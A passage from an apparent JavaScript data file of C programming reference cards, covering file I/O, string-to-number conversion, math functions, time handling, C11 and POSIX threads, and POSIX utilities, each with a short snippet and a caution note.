    note: "Call it before any I/O on the stream. Unbuffered output is slow but appears immediately.",
    pop: 3,
  },
  {
    title: "fprintf and fscanf",
    cat: "Files",
    tags: ["fprintf", "fscanf", "format", "read", "write", "file", "parse"],
    aka: "how to write formatted text to a file or read it back",
    sum: "fprintf writes formatted text; fscanf reads it back, but is fragile.",
    code: c`fprintf(fp, "%s %d\n", name, age);

char in_name[64];
int in_age;
if (fscanf(fp, "%63s %d", in_name, &in_age) == 2) {
    printf("%s is %d\n", in_name, in_age);
}`,
    note: "fscanf %s needs a width limit. It leaves newlines in the stream and is hard to recover from on malformed input.",
    pop: 5,
  },
  {
    title: "fputs and fgetc",
    cat: "Files",
    tags: ["fputs", "fgetc", "character", "write", "read", "stream", "loop"],
    aka: "how to read or write one character at a time",
    sum: "fgetc returns an int so it can signal EOF; fputc writes one byte.",
    code: c`int c;
while ((c = fgetc(fp)) != EOF) {
    fputc(c, out);
}

fputs("line without newline", fp);
fputc('\n', fp);`,
    note: "Store the result in int, not char, or EOF may be confused with byte 0xFF.",
    pop: 5,
  },
  {
    title: "Copy a file",
    cat: "Files",
    tags: ["copy", "file", "fread", "fwrite", "chunk", "binary", "duplicate"],
    aka: "how to copy a file in c",
    sum: "Read fixed-size chunks and write them until input runs out.",
    code: c`char buf[8192];
size_t n;

while ((n = fread(buf, 1, sizeof buf, in)) > 0) {
    if (fwrite(buf, 1, n, out) != n) {
        perror("fwrite");
        break;
    }
}

if (ferror(in)) perror("fread");`,
    note: "Check both streams and fclose them. Chunked copy is much faster than fgetc/fputc.",
    pop: 4,
  },
  {
    title: "Count lines in a file",
    cat: "Files",
    tags: ["count", "lines", "file", "newline", "wc", "read"],
    aka: "how to count lines in a text file",
    sum: "Count newline bytes as you stream the file.",
    code: c`size_t lines = 0;
int c;

while ((c = fgetc(fp)) != EOF) {
    if (c == '\n') lines++;
}

// count a final line without a newline:
// add 1 if the last byte was not '\n'`,
    note: "For very large files, read blocks with fread and count newlines with memchr.",
    pop: 3,
  },
  {
    title: "Read a CSV file",
    cat: "Files",
    tags: ["csv", "read", "parse", "file", "delimiter", "line", "fields"],
    aka: "how to parse a csv file in c",
    sum: "Read line by line, then split on commas.",
    code: c`char line[1024];

while (fgets(line, sizeof line, fp)) {
    char *save = NULL;
    char *field = strtok_r(line, ",", &save);

    while (field) {
        printf("[%s]", field);
        field = strtok_r(NULL, ",", &save);
    }
    putchar('\n');
}`,
    note: "This ignores quoted commas, escaped quotes, and embedded newlines. Use a CSV library for real data.",
    pop: 4,
  },
  {
    title: "Write a CSV file",
    cat: "Files",
    tags: ["csv", "write", "file", "delimiter", "quote", "escape", "export"],
    aka: "how to write csv data to a file",
    sum: "Separate fields with commas and quote fields that contain commas, quotes, or newlines.",
    code: c`fprintf(fp, "%s,%d,%.2f\n", name, age, score);

// quote a field:
fputc('"', fp);
for (const char *p = text; *p; p++) {
    if (*p == '"') fputc('"', fp);  // double the quote
    fputc(*p, fp);
}
fputc('"', fp);`,
    note: "Always check the return value of fprintf/fputc, and fclose at the end to flush.",
    pop: 3,
  },

  {
    title: "atoi and atol",
    cat: "Stdlib",
    tags: ["atoi", "atol", "convert", "string", "number", "parse", "integer"],
    aka: "how to convert a string to an integer",
    sum: "atoi is convenient but cannot report errors. Use strtol for real input.",
    code: c`#include <stdlib.h>

int n = atoi("42");
long l = atol("123456");

// no error signal: atoi("abc") == 0
// and values outside range are undefined`,
    note: "atoi returns 0 for both \"0\" and invalid text. Never use it for untrusted input.",
    pop: 5,
  },
  {
    title: "strtol with error checking",
    cat: "Stdlib",
    tags: ["strtol", "parse", "integer", "error", "range", "base", "convert"],
    aka: "how to safely parse an integer from a string",
    sum: "strtol reports where parsing stopped and whether the value overflowed.",
    code: c`#include <errno.h>
#include <stdlib.h>

char *end;
errno = 0;
long value = strtol(text, &end, 10);

if (end == text) {
    // no digits at all
} else if (*end != '\0') {
    // trailing junk
} else if (errno == ERANGE) {
    // out of range for long
}`,
    note: "Use base 0 to accept 0x hex and leading-0 octal. Cast to int only after checking the range.",
    pop: 6,
  },
  {
    title: "strtod",
    cat: "Stdlib",
    tags: ["strtod", "parse", "double", "float", "convert", "string", "number"],
    aka: "how to parse a floating point number from a string",
    sum: "strtod parses a double and optionally reports where it stopped.",
    code: c`#include <errno.h>
#include <stdlib.h>

char *end;
errno = 0;
double d = strtod("3.14159xyz", &end);

if (end != text && errno != ERANGE) {
    printf("%f, rest: %s\n", d, end);  // rest: xyz
}`,
    note: "Accepts decimal, exponent, hex floats, inf, and nan. Underflow also sets ERANGE.",
    pop: 5,
  },
  {
    title: "strtoul",
    cat: "Stdlib",
    tags: ["strtoul", "unsigned", "parse", "convert", "base", "hex", "number"],
    aka: "how to parse an unsigned integer or hex string",
    sum: "strtoul parses unsigned long values, with an optional base.",
    code: c`#include <errno.h>
#include <stdlib.h>

char *end;
errno = 0;
unsigned long u = strtoul("0xFF", &end, 0);  // 255

if (end == text || *end != '\0' || errno == ERANGE) {
    // invalid
}`,
    note: "A leading minus is accepted and negated, which is rarely what you want. Check for '-' first.",
    pop: 4,
  },
  {
    title: "abs, labs, and llabs",
    cat: "Stdlib",
    tags: ["abs", "labs", "llabs", "absolute", "value", "integer", "math"],
    aka: "how to get the absolute value of an integer",
    sum: "abs works on int, labs on long, llabs on long long.",
    code: c`#include <stdlib.h>

int a = abs(-5);          // 5
long l = labs(-5L);       // 5
long long ll = llabs(-5LL);

// floating point uses fabs from math.h:
double d = fabs(-2.5);`,
    note: "abs(INT_MIN) overflows because the positive value does not fit. Check before negating.",
    pop: 4,
  },
  {
    title: "div and ldiv",
    cat: "Stdlib",
    tags: ["div", "ldiv", "quotient", "remainder", "divide", "modulo", "stdlib"],
    aka: "how to get quotient and remainder at the same time",
    sum: "div computes both the quotient and remainder in one call.",
    code: c`#include <stdlib.h>

div_t d = div(17, 5);
printf("%d remainder %d\n", d.quot, d.rem);  // 3 remainder 2

ldiv_t ld = ldiv(17L, 5L);`,
    note: "Division truncates toward zero. For negative values the remainder takes the sign of the dividend.",
    pop: 3,
  },
  {
    title: "exit",
    cat: "Stdlib",
    tags: ["exit", "quit", "terminate", "status", "cleanup", "atexit"],
    aka: "how to exit a program from anywhere",
    sum: "End the process with a status code, flushing output and running atexit handlers.",
    code: c`#include <stdlib.h>

if (argc < 2) {
    fprintf(stderr, "usage: %s file\n", argv[0]);
    exit(EXIT_FAILURE);
}

exit(EXIT_SUCCESS);`,
    note: "Use EXIT_SUCCESS and EXIT_FAILURE for portable status values. exit from a library should be a last resort.",
    pop: 5,
  },
  {
    title: "abort",
    cat: "Stdlib",
    tags: ["abort", "crash", "fatal", "sigabrt", "assert", "terminate"],
    aka: "how to abort the program immediately",
    sum: "Abort immediately with SIGABRT, without normal cleanup.",
    code: c`#include <stdlib.h>

if (corrupted_state) {
    fprintf(stderr, "fatal: corrupted state\n");
    abort();
}`,
    note: "Output streams may not be flushed and atexit handlers do not run. Use for unrecoverable programmer errors.",
    pop: 3,
  },
  {
    title: "quick_exit and _Exit",
    cat: "Stdlib",
    tags: ["quick_exit", "exit", "terminate", "no", "cleanup", "c11", "c99"],
    aka: "how to exit without running cleanup handlers",
    sum: "_Exit ends immediately; quick_exit runs at_quick_exit handlers but skips normal cleanup.",
    code: c`#include <stdio.h>
#include <stdlib.h>

void bye(void) { puts("quick cleanup"); }

int main(void) {
    at_quick_exit(bye);
    quick_exit(EXIT_SUCCESS);
}

// hard stop, no handlers, no stdio flush:
void hard_stop(void) {
    _Exit(EXIT_FAILURE);
}`,
    note: "C11 quick_exit; C99 _Exit. Useful after fork in a child process to avoid double-flushing buffers.",
    pop: 2,
  },
  {
    title: "getenv",
    cat: "Stdlib",
    tags: ["getenv", "environment", "variable", "env", "home", "path", "config"],
    aka: "how to read an environment variable",
    sum: "getenv returns the value of an environment variable, or NULL.",
    code: c`#include <stdlib.h>

const char *home = getenv("HOME");
if (home) {
    printf("home: %s\n", home);
} else {
    puts("HOME is not set");
}`,
    note: "The returned pointer belongs to the environment; do not modify or free it. Copy it if you need it later.",
    pop: 4,
  },
  {
    title: "system",
    cat: "Stdlib",
    tags: ["system", "shell", "command", "execute", "run", "process"],
    aka: "how to run a shell command from c",
    sum: "Run a command through the system shell and wait for it.",
    code: c`#include <stdlib.h>

int rc = system("ls -l");
if (rc == -1) {
    perror("system");
} else if (rc != 0) {
    printf("command failed: %d\n", rc);
}`,
    note: "The return value is shell-specific. Never pass unvalidated user input: shell metacharacters enable command injection.",
    pop: 4,
  },

  {
    title: "sqrt and pow",
    cat: "Math",
    tags: ["sqrt", "pow", "square", "root", "power", "math", "exponent"],
    aka: "how to calculate a square root or power",
    sum: "sqrt takes a square root; pow raises a number to a power.",
    code: c`#include <math.h>

double root = sqrt(2.0);       // 1.414...
double square = pow(x, 2);     // x * x
double cube = pow(x, 3.0);
double inv = pow(x, -1.0);     // 1 / x

double cbrt_v = cbrt(27.0);    // 3.0`,
    note: "Link with -lm on Linux. sqrt(-1) returns NaN; check with isnan.",
    pop: 7,
  },
  {
    title: "fabs",
    cat: "Math",
    tags: ["fabs", "absolute", "float", "double", "math", "abs"],
    aka: "how to get the absolute value of a double",
    sum: "fabs returns the absolute value of a floating-point number.",
    code: c`#include <math.h>

double d = fabs(-3.5);       // 3.5
float f = fabsf(-3.5f);
long double ld = fabsl(-3.5L);`,
    note: "Do not use abs() for floating point: it converts to int and truncates.",
    pop: 5,
  },
  {
    title: "floor, ceil, trunc, and round",
    cat: "Math",
    tags: ["floor", "ceil", "trunc", "round", "rounding", "nearest", "integer"],
    aka: "how to round a double to an integer",
    sum: "floor goes down, ceil goes up, trunc drops the fraction, round goes to nearest.",
    code: c`floor(2.7);    //  2.0
ceil(2.1);     //  3.0
trunc(-2.7);   // -2.0
round(2.5);    //  3.0 (half away from zero)
round(-2.5);   // -3.0

// to an integer type:
long n = lround(2.5);`,
    note: "All return double except lround/llround. round is not banker's rounding.",
    pop: 6,
  },
  {
    title: "fmod",
    cat: "Math",
    tags: ["fmod", "modulo", "remainder", "float", "division", "wrap"],
    aka: "how to get the remainder of a floating point division",
    sum: "fmod returns the remainder with the sign of the dividend.",
    code: c`#include <math.h>

double r = fmod(7.5, 2.0);    // 1.5
double s = fmod(-7.5, 2.0);   // -1.5

// wrap an angle into [0, 360):
double deg = fmod(angle, 360.0);
if (deg < 0) deg += 360.0;`,
    note: "The % operator only works on integers. remainder() uses a different rounding rule.",
    pop: 4,
  },
  {
    title: "Trig functions",
    cat: "Math",
    tags: ["sin", "cos", "tan", "trig", "sine", "cosine", "tangent", "radians"],
    aka: "how to calculate sine and cosine",
    sum: "sin, cos, and tan take radians.",
    code: c`#include <math.h>

double s = sin(M_PI / 2);   // 1.0
double c = cos(0.0);        // 1.0
double t = tan(M_PI / 4);   // 1.0

// inverse:
double a = asin(1.0);       // pi/2`,
    note: "Convert degrees to radians first: rad = deg * (M_PI / 180). Link with -lm.",
    pop: 5,
  },
  {
    title: "atan2",
    cat: "Math",
    tags: ["atan2", "angle", "quadrant", "atan", "direction", "math"],
    aka: "how to get the angle of a vector",
    sum: "atan2(y, x) returns the angle in radians, handling all four quadrants.",
    code: c`#include <math.h>

double angle = atan2(y, x);   // -pi .. pi

double deg = angle * (180.0 / M_PI);
if (deg < 0) deg += 360.0;`,
    note: "Prefer atan2(y, x) over atan(y / x): it is correct when x is 0 or negative.",
    pop: 4,
  },
  {
    title: "log and exp",
    cat: "Math",
    tags: ["log", "log10", "exp", "natural", "logarithm", "exponential", "e"],
    aka: "how to calculate a logarithm or exponential",
    sum: "log is natural log, log10 is base 10, and exp computes e to a power.",
    code: c`#include <math.h>

double ln = log(x);       // natural log, x > 0
double l10 = log10(100);  // 2.0
double l2 = log2(8);      // 3.0
double e = exp(1.0);      // 2.718...

// log base b:
double lb = log(x) / log(b);`,
    note: "log(0) is -infinity and log(negative) is NaN. Check the domain before calling.",
    pop: 5,
  },
  {
    title: "hypot",
    cat: "Math",
    tags: ["hypot", "distance", "triangle", "length", "vector", "sqrt"],
    aka: "how to calculate the hypotenuse or vector length",
    sum: "hypot(x, y) computes sqrt(x*x + y*y) without intermediate overflow.",
    code: c`#include <math.h>

double d = hypot(3.0, 4.0);      // 5.0
double d3 = hypot(hypot(x, y), z);`,
    note: "Safer than sqrt(x*x + y*y) when x or y is very large or small. Link with -lm.",
    pop: 3,
  },
  {
    title: "fmin and fmax",
    cat: "Math",
    tags: ["fmin", "fmax", "minimum", "maximum", "min", "max", "float"],
    aka: "how to get the smaller or larger of two doubles",
    sum: "fmin and fmax return the smaller or larger value, with defined NaN behavior.",
    code: c`#include <math.h>

double lo = fmin(a, b);
double hi = fmax(a, b);

// fmin(NAN, 3.0) returns 3.0`,
    note: "Unlike a < b ? a : b, fmin/fmax ignore a single NaN. There are no integer versions in ISO C.",
    pop: 4,
  },
  {
    title: "isnan and isinf",
    cat: "Math",
    tags: ["isnan", "isinf", "isfinite", "nan", "infinity", "check", "float"],
    aka: "how to check for nan or infinity",
    sum: "Classify floating-point values before using them.",
    code: c`#include <math.h>

if (isnan(x)) {
    puts("not a number");
} else if (isinf(x)) {
    puts("infinity");
} else if (isfinite(x)) {
    puts("finite");
}`,
    note: "These are macros. x != x also detects NaN, but -Wfloat-equal complains. NaN compares false to everything.",
    pop: 5,
  },
  {
    title: "INFINITY and NAN",
    cat: "Math",
    tags: ["infinity", "nan", "constants", "math", "infinite", "not", "number"],
    aka: "how to create infinity or nan",
    sum: "math.h defines INFINITY and NAN macros.",
    code: c`#include <math.h>

double inf = INFINITY;
double neg = -INFINITY;
double nan = NAN;

printf("%f %f\n", inf, nan);   // inf nan
if (x != x) puts("x is NaN");`,
    note: "Floating-point infinity is not an integer. INFINITY requires math.h and may need -lm on old systems.",
    pop: 4,
  },
  {
    title: "M_PI and pi",
    cat: "Math",
    tags: ["pi", "m_pi", "constant", "circle", "trig", "math"],
    aka: "is there a pi constant in c",
    sum: "M_PI is widely available but not ISO C; define your own for portability.",
    code: c`#include <math.h>

// POSIX / common extension:
double pi = M_PI;

// portable:
#define PI 3.14159265358979323846

double area = PI * r * r;`,
    note: "On Windows define _USE_MATH_DEFINES before including math.h. Prefer your own constant in portable code.",
    pop: 5,
  },
  {
    title: "Link the math library",
    cat: "Math",
    tags: ["lm", "link", "math", "gcc", "undefined", "reference", "sqrt"],
    aka: "undefined reference to sqrt",
    sum: "On Linux, pass -lm after your source and object files.",
    code: c`gcc main.c -o main -lm

# with other libraries, order still matters:
gcc main.c util.c -lm -lpthread -o main`,
    note: "The linker resolves left to right, so -lm must come after the objects that use it. Some platforms include math in libc.",
    pop: 6,
  },
  {
    title: "Float versions of math functions",
    cat: "Math",
    tags: ["sqrtf", "sinf", "powf", "float", "double", "long", "double", "suffix"],
    aka: "what is the difference between sqrt and sqrtf",
    sum: "The f suffix works on float, the l suffix on long double, and the plain name on double.",
    code: c`float f = sqrtf(2.0f);
double d = sqrt(2.0);
long double ld = sqrtl(2.0L);

float s = sinf(x);
double c = cos(x);`,
    note: "Using sqrt on a float converts to double and back. Use the matching version in hot float code.",
    pop: 4,
  },
  {
    title: "Round to N decimal places",
    cat: "Math",
    tags: ["round", "decimal", "places", "precision", "format", "money"],
    aka: "how to round to two decimal places",
    sum: "Scale, round, then unscale — or simply format with printf.",
    code: c`#include <math.h>

double round_to(double x, int places) {
    double scale = pow(10.0, places);
    return round(x * scale) / scale;
}

printf("%.2f\n", 3.14159);   // display only

// for money, store integer cents:
long cents = lround(amount * 100);`,
    note: "Binary floating point cannot represent most decimal fractions exactly. Do not use doubles for accounting.",
    pop: 5,
  },
  {
    title: "Degrees and radians",
    cat: "Math",
    tags: ["degrees", "radians", "convert", "angle", "trig", "pi"],
    aka: "how to convert degrees to radians",
    sum: "Multiply degrees by pi/180 to get radians; multiply radians by 180/pi to go back.",
    code: c`#include <math.h>

double to_radians(double deg) {
    return deg * (M_PI / 180.0);
}

double to_degrees(double rad) {
    return rad * (180.0 / M_PI);
}`,
    note: "All standard trig functions take and return radians. Normalize angles into a fixed range when wrapping.",
    pop: 4,
  },

  {
    title: "Current time",
    cat: "Time",
    tags: ["time", "now", "current", "epoch", "unix", "timestamp", "clock"],
    aka: "how to get the current time in c",
    sum: "time(NULL) returns seconds since 1970-01-01 UTC.",
    code: c`#include <time.h>

time_t now = time(NULL);
if (now == (time_t)-1) {
    perror("time");
}

printf("%lld\n", (long long)now);`,
    note: "time_t may be 32-bit or 64-bit. Do not assume it is a long; cast for printf.",
    pop: 7,
  },
  {
    title: "CPU time with clock",
    cat: "Time",
    tags: ["clock", "cpu", "time", "process", "ticks", "benchmark"],
    aka: "how to measure cpu time used by my program",
    sum: "clock measures processor time used by the process, not wall-clock time.",
    code: c`#include <time.h>

clock_t start = clock();

// work

clock_t end = clock();
double seconds = (double)(end - start) / CLOCKS_PER_SEC;
printf("%.3f s CPU\n", seconds);`,
    note: "Resolution is coarse and includes only CPU time. Use clock_gettime(CLOCK_MONOTONIC) for wall time.",
    pop: 4,
  },
  {
    title: "Time difference",
    cat: "Time",
    tags: ["difftime", "difference", "elapsed", "seconds", "time", "between"],
    aka: "how to find the difference between two times",
    sum: "difftime returns the difference in seconds as a double.",
    code: c`#include <time.h>

time_t start = time(NULL);
// ...
time_t end = time(NULL);

double elapsed = difftime(end, start);
printf("%.0f seconds\n", elapsed);`,
    note: "Only whole seconds with time_t. For sub-second timing use timespec and clock_gettime.",
    pop: 4,
  },
  {
    title: "localtime and gmtime",
    cat: "Time",
    tags: ["localtime", "gmtime", "utc", "local", "timezone", "struct", "tm"],
    aka: "how to convert a timestamp to a date",
    sum: "Convert time_t into a struct tm in local time or UTC.",
    code: c`#include <time.h>

time_t now = time(NULL);
struct tm local = *localtime(&now);
struct tm utc = *gmtime(&now);

printf("%04d-%02d-%02d\n",
       utc.tm_year + 1900,
       utc.tm_mon + 1,
       utc.tm_mday);`,
    note: "Both return pointers to static storage; copy the struct before calling again. tm_year is years since 1900 and tm_mon is 0-based.",
    pop: 6,
  },
  {
    title: "Format a date with strftime",
    cat: "Time",
    tags: ["strftime", "format", "date", "time", "iso", "8601", "string"],
    aka: "how to format a date as a string",
    sum: "strftime writes a formatted date/time into a buffer.",
    code: c`#include <time.h>

char buf[64];
time_t now = time(NULL);
struct tm tm = *localtime(&now);

if (strftime(buf, sizeof buf, "%Y-%m-%d %H:%M:%S", &tm) == 0) {
    puts("buffer too small");
} else {
    puts(buf);
}

// ISO 8601 with offset:
// strftime(buf, sizeof buf, "%Y-%m-%dT%H:%M:%S%z", &tm);`,
    note: "Many specifiers are locale-dependent. %z may be empty on some platforms; check the result.",
    pop: 6,
  },
  {
    title: "Parse a date",
    cat: "Time",
    tags: ["mktime", "strptime", "parse", "date", "time", "convert", "timestamp"],
    aka: "how to convert a date string to time_t",
    sum: "Fill a struct tm, then call mktime. strptime parses text on POSIX.",
    code: c`#include <time.h>

struct tm tm = {0};
tm.tm_year = 2026 - 1900;
tm.tm_mon  = 11 - 1;
tm.tm_mday = 17;
tm.tm_isdst = -1;          // let the library decide

time_t t = mktime(&tm);    // local time

// POSIX parsing:
// strptime("2026-11-17", "%Y-%m-%d", &tm);`,
    note: "mktime normalizes out-of-range fields. Use timegm for UTC (nonstandard). Set tm_isdst=-1 to avoid DST bugs.",
    pop: 5,
  },
  {
    title: "High-resolution time (timespec_get)",
    cat: "Time",
    tags: ["timespec_get", "nanosecond", "high", "resolution", "c11", "timestamp"],
    aka: "how to get nanosecond time in c11",
    sum: "C11 timespec_get fills a struct timespec with the current UTC time.",
    code: c`#include <time.h>

struct timespec ts;
if (timespec_get(&ts, TIME_UTC) != 0) {
    printf("%lld.%09ld\n",
           (long long)ts.tv_sec, ts.tv_nsec);
}`,
    note: "The nanosecond field does not guarantee nanosecond resolution. TIME_UTC is the only standard base.",
    pop: 4,
  },
  {
    title: "clock_gettime",
    cat: "Time",
    tags: ["clock_gettime", "monotonic", "posix", "nanosecond", "timer", "realtime"],
    aka: "how to get a monotonic timestamp",
    sum: "POSIX clock_gettime reads a clock with nanosecond fields.",
    code: c`#include <time.h>

struct timespec ts;
if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    perror("clock_gettime");
}
printf("%lld.%09ld\n", (long long)ts.tv_sec, ts.tv_nsec);`,
    note: "CLOCK_MONOTONIC never jumps backward and is right for measuring intervals. Some systems need -lrt.",
    pop: 5,
  },
  {
    title: "Measure elapsed time",
    cat: "Time",
    tags: ["elapsed", "benchmark", "timer", "monotonic", "measure", "performance"],
    aka: "how to time a block of code",
    sum: "Take a monotonic timestamp before and after, then subtract.",
    code: c`#include <time.h>

struct timespec a, b;
clock_gettime(CLOCK_MONOTONIC, &a);

// work

clock_gettime(CLOCK_MONOTONIC, &b);

double ms = (b.tv_sec - a.tv_sec) * 1e3
          + (b.tv_nsec - a.tv_nsec) / 1e6;
printf("%.3f ms\n", ms);`,
    note: "Use CLOCK_MONOTONIC, not CLOCK_REALTIME: wall-clock adjustments would corrupt the measurement.",
    pop: 6,
  },

  {
    title: "Create and join a thread",
    cat: "Threads",
    tags: ["thread", "create", "join", "thrd", "c11", "concurrent", "parallel"],
    aka: "how to start a thread in c11",
    sum: "thrd_create starts a function in a new thread; thrd_join waits for it.",
    code: c`#include <stdio.h>
#include <threads.h>

int work(void *arg) {
    int *n = arg;
    printf("thread got %d\n", *n);
    return 0;
}

int main(void) {
    int value = 42;
    thrd_t t;

    if (thrd_create(&t, work, &value) != thrd_success) {
        return 1;
    }

    int result;
    thrd_join(t, &result);
    return 0;
}`,
    note: "C11 threads. Link with -pthread on glibc. The argument must outlive the thread unless you copy it.",
    pop: 6,
  },
  {
    title: "Detach a thread",
    cat: "Threads",
    tags: ["detach", "thread", "background", "thrd_detach", "join", "c11"],
    aka: "how to run a thread in the background",
    sum: "A detached thread cleans up after itself and cannot be joined.",
    code: c`#include <threads.h>

thrd_t t;
if (thrd_create(&t, work, arg) == thrd_success) {
    thrd_detach(t);
}`,
    note: "Choose exactly one: join or detach. Detached threads must not outlive resources they use at shutdown.",
    pop: 4,
  },
  {
    title: "Mutex",
    cat: "Threads",
    tags: ["mutex", "lock", "mtx", "critical", "section", "synchronization", "thread"],
    aka: "how to protect shared data between threads",
    sum: "A mutex serializes access to a critical section.",
    code: c`#include <threads.h>

mtx_t lock;
mtx_init(&lock, mtx_plain);
int shared_counter = 0;

mtx_lock(&lock);
shared_counter++;
mtx_unlock(&lock);

mtx_destroy(&lock);`,
    note: "Keep critical sections short and never return while holding a lock. mtx_recursive allows the same thread to lock twice.",
    pop: 6,
  },
  {
    title: "Condition variable",
    cat: "Threads",
    tags: ["condition", "variable", "cnd", "wait", "signal", "broadcast", "thread"],
    aka: "how to wait until another thread signals",
    sum: "Wait for a predicate while holding a mutex; another thread signals when it changes.",
    code: c`#include <threads.h>

mtx_t m;
cnd_t c;
int ready = 0;

// consumer:
mtx_lock(&m);
while (!ready) {
    cnd_wait(&c, &m);
}
mtx_unlock(&m);

// producer:
mtx_lock(&m);
ready = 1;
cnd_signal(&c);
mtx_unlock(&m);`,
    note: "Always wait in a while loop: spurious wakeups are allowed. Use cnd_broadcast to wake everyone.",
    pop: 5,
  },
  {
    title: "Atomic variables",
    cat: "Threads",
    tags: ["atomic", "stdatomic", "atomic_int", "load", "store", "c11", "thread"],
    aka: "how to use atomic_int in c",
    sum: "Atomic types make individual reads and writes indivisible without a mutex.",
    code: c`#include <stdatomic.h>

atomic_int counter = 0;

atomic_store(&counter, 1);
int v = atomic_load(&counter);

// also atomic:
counter++;
counter += 5;`,
    note: "Atomics do not make a group of operations atomic. They are for single variables and simple flags.",
    pop: 5,
  },
  {
    title: "Atomic fetch_add",
    cat: "Threads",
    tags: ["fetch_add", "atomic", "increment", "counter", "rmw", "thread"],
    aka: "how to atomically increment a counter",
    sum: "fetch_add increments atomically and returns the previous value.",
    code: c`#include <stdatomic.h>

atomic_int counter = 0;

int old = atomic_fetch_add(&counter, 1);
int now = atomic_load(&counter);

// old + 1 == now`,
    note: "Use fetch_sub, fetch_or, fetch_and, and exchange similarly. Relaxed ordering is enough for a plain counter.",
    pop: 4,
  },
  {
    title: "Memory order",
    cat: "Threads",
    tags: ["memory_order", "acquire", "release", "seq_cst", "relaxed", "ordering", "atomic"],
    aka: "what is memory order in c atomics",
    sum: "Memory order controls which surrounding reads and writes may be reordered around an atomic operation.",
    code: c`#include <stdatomic.h>

atomic_int flag = 0;
int data = 0;

// publisher:
data = 42;
atomic_store_explicit(&flag, 1, memory_order_release);

// consumer:
while (!atomic_load_explicit(&flag, memory_order_acquire)) {
    // spin
}
printf("%d\n", data);   // guaranteed to see 42`,
    note: "Default seq_cst is easiest to reason about. release/acquire pair for publishing data; relaxed only for counters.",
    pop: 4,
  },
  {
    title: "Thread-local storage",
    cat: "Threads",
    tags: ["thread_local", "tls", "thread", "local", "storage", "c11", "global"],
    aka: "how to give each thread its own variable",
    sum: "Each thread gets a separate copy of a thread-local variable.",
    code: c`#include <threads.h>

_Thread_local int counter = 0;

void bump(void) {
    counter++;   // private to the calling thread
}`,
    note: "C11. Initialize only with constant expressions. The address is unique per thread.",
    pop: 4,
  },
  {
    title: "call_once",
    cat: "Threads",
    tags: ["call_once", "once", "init", "lazy", "thread", "singleton"],
    aka: "how to initialize something exactly once across threads",
    sum: "call_once runs a function exactly one time, no matter how many threads call it.",
    code: c`#include <threads.h>

once_flag flag = ONCE_FLAG_INIT;

void init(void) {
    // expensive one-time setup
}

void ensure_init(void) {
    call_once(&flag, init);
}`,
    note: "Other threads block until initialization completes. Leaving the callback via longjmp is undefined behavior.",
    pop: 4,
  },
  {
    title: "Data race",
    cat: "Threads",
    tags: ["data", "race", "unsynchronized", "undefined", "thread", "bug"],
    aka: "what is a data race",
    sum: "Two threads access the same object, at least one writes, without synchronization.",
    code: c`int counter = 0;   // shared

// thread A:
counter++;

// thread B:
counter++;

// undefined behavior: use an atomic or a mutex`,
    note: "A data race is undefined behavior, not just a wrong value. Even reading while another thread writes is a race.",
    pop: 5,
  },
  {
    title: "Deadlock",
    cat: "Threads",
    tags: ["deadlock", "lock", "order", "mutex", "hang", "thread", "avoid"],
    aka: "why is my multithreaded program hanging",
    sum: "Threads wait forever for locks held by each other.",
    code: c`// thread 1:
mtx_lock(&a);
mtx_lock(&b);

// thread 2:
mtx_lock(&b);
mtx_lock(&a);   // deadlock possible

// fix: always lock in the same global order`,
    note: "Keep lock order consistent, hold one lock at a time, or use try-lock with backoff. Debug with thread sanitizers.",
    pop: 5,
  },
  {
    title: "pthreads",
    cat: "Threads",
    tags: ["pthread", "posix", "thread", "pthread_create", "pthread_join", "unix", "linux"],
    aka: "how to use pthreads instead of c11 threads",
    sum: "POSIX threads are more widely available and feature-rich than C11 threads.",
    code: c`#include <pthread.h>
#include <stdio.h>
#include <string.h>

void *work(void *arg) {
    return NULL;
}

pthread_t t;
int rc = pthread_create(&t, NULL, work, NULL);
if (rc != 0) {
    fprintf(stderr, "pthread_create: %s\n", strerror(rc));
}

pthread_join(t, NULL);`,
    note: "Link with -pthread. C11 threads map onto pthreads on Linux but are less portable to older systems.",
    pop: 5,
  },

  {
    title: "Parse options with getopt",
    cat: "POSIX",
    tags: ["getopt", "options", "arguments", "flags", "argv", "cli", "posix"],
    aka: "how to parse command line options",
    sum: "getopt walks short options such as -v and -o file.",
    code: c`#include <stdio.h>
#include <unistd.h>

int verbose = 0;
char *output = NULL;
int opt;

while ((opt = getopt(argc, argv, "vo:")) != -1) {
    switch (opt) {
    case 'v': verbose = 1; break;
    case 'o': output = optarg; break;
    default:
        fprintf(stderr, "usage: %s [-v] [-o file]\n", argv[0]);
        return 1;
    }
}

// remaining operands start at argv[optind]`,
    note: "POSIX. A colon after a letter means it takes an argument. Use getopt_long for --long-options.",
    pop: 5,
  },
  {
    title: "Read a directory",
    cat: "POSIX",
    tags: ["directory", "readdir", "opendir", "dir", "list", "files", "posix"],
    aka: "how to list files in a directory",
    sum: "opendir/readdir iterate directory entries.",
    code: c`#include <dirent.h>
#include <stdio.h>

DIR *dir = opendir(".");
if (!dir) {
    perror("opendir");
    return 1;
}

struct dirent *entry;
while ((entry = readdir(dir)) != NULL) {
    if (entry->d_name[0] == '.') continue;
    puts(entry->d_name);
}
closedir(dir);`,
    note: "Returns . and .. too. Order is unspecified. Use stat for size, type, and timestamps.",
    pop: 5,
  },
  {
    title: "stat a file",
    cat: "POSIX",
    tags: ["stat", "file", "size", "metadata", "mode", "permissions", "posix"],
    aka: "how to get file size or check if it is a directory",
    sum: "stat fills a struct with size, mode, timestamps, and ownership.",
    code: c`#include <sys/stat.h>

struct stat st;
if (stat(path, &st) != 0) {
    perror("stat");
    return 1;
}

printf("%lld bytes\n", (long long)st.st_size);

if (S_ISDIR(st.st_mode)) puts("directory");
if (S_ISREG(st.st_mode)) puts("regular file");`,
    note: "stat follows symlinks; lstat examines the link itself. Access time and birth time are not portable.",
    pop: 5,
  },
  {
    title: "Memory-map a file",
    cat: "POSIX",
    tags: ["mmap", "map", "file", "memory", "read", "write", "posix"],
    aka: "how to mmap a file in c",
    sum: "Map a file into memory and access it like an array.",
    code: c`#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

int fd = open("data.bin", O_RDONLY);
struct stat st;
fstat(fd, &st);

char *p = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
if (p == MAP_FAILED) {
    perror("mmap");
}

// use p[0 .. st.st_size-1]

munmap(p, st.st_size);
close(fd);`,
    note: "The mapping is page-granular; the offset must be page-aligned. Do not let the file shrink while mapped.",
    pop: 4,
  },
  {
    title: "fork and wait",
    cat: "POSIX",
